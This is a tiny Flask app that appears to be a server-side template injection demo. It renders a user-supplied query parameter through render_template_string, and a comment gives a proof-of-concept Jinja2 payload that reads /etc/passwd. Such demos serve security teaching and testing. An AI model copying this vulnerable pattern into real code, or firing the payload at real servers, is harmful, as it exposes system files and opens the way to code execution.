from flask import Flask,render_template,request,render_template_string

app=Flask(__name__)

@app.route('/',methods=['GET','POST'])
def test():
    code = request.args.get('test')
    html = '<html>%s</html>'%code
    return render_template_string(html)

#poc：http://example_ip:port/?test={{%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()}}
	
